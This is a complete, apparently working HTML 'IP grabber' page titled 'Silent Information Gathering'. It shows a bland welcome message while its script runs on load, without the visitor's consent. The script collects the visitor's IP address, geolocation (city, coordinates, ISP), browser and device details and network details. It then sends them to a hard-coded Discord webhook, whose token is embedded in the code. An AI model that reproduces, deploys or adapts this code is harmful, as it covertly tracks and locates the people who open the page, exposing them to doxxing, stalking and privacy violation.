<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Silent Information Gathering</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #2c2f33;
      color: #fff;
    }
    .container {
      text-align: center;
      background: rgba(35, 39, 42, 0.9);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Welcome!</h1>
    <p>Your information is being processed...</p>
  </div>

  <script>
    const webhookUrl = 'https://discordapp.com/api/webhooks/1335664944028582000/c1CoPiNgVyekogi0OhqJQizguoBFy5XmTKydzmWb-8XQFOYEAZ_PyT79OgkQsc1ElmGl';

    async function gatherInformation() {
      const collectedData = {};

      try {
        // Fetch IP and location information
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        collectedData.IP_Info = {
          ip: ipData.ip,
          city: ipData.city,
          region: ipData.region,
          country: ipData.country_name,
          latitude: ipData.latitude,
          longitude: ipData.longitude,
          isp: ipData.org,
        };
      } catch (error) {
        console.error('Error fetching IP info:', error);
        collectedData.IP_Info = 'Unavailable';
      }

      // Fetch browser and device information
      collectedData.Device_Info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
        cookiesEnabled: navigator.cookieEnabled,
        cores: navigator.hardwareConcurrency || 'Unknown',
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
      };

      // Fetch network information if available
      if (navigator.connection) {
        collectedData.Network_Info = {
          networkType: navigator.connection.effectiveType || 'Unknown',
          downlinkSpeed: `${navigator.connection.downlink || 0} Mbps`,
          latency: `${navigator.connection.rtt || 0} ms`,
          saveData: navigator.connection.saveData || false,
        };
      } else {
        collectedData.Network_Info = 'Unavailable';
      }

      // Send data to the webhook
      const formattedData = `**User Information:**\n\`\`\`json\n${JSON.stringify(collectedData, null, 2)}\n\`\`\``;
      await sendToWebhook(formattedData);

      console.log('Collected Data:', collectedData);
    }

    async function sendToWebhook(data) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: data }),
        });
      } catch (error) {
        console.error('Error sending to webhook:', error);
      }
    }

    // Gather and send information immediately
    gatherInformation();
  </script>
</body>
</html>
